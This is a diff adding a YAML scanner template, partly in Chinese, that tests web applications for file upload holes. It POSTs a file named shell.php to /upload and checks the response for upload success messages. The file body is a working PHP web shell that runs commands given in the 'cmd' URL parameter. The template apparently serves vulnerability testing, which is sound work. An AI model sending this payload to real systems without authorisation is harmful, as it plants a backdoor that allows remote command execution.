@@ -1,0 +1,26 @@
+name: 文件上传漏洞测试
+description: 测试文件上传漏洞
+level: 高
+author: Test
+request:
+  method: POST
+  path: /upload
+  params:
+    action: "upload"
+    type: "avatar"
+  headers:
+    Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+  body: "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET['cmd']); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--"
+response:
+  matchType: contains
+  successIndicators:
+    - "file uploaded successfully"
+    - "upload complete"
+    - "上传成功"
+  errorIndicators:
+    - "invalid file type"
+    - "file not allowed"
+    - "文件类型不允许"
+  statusCode: 200
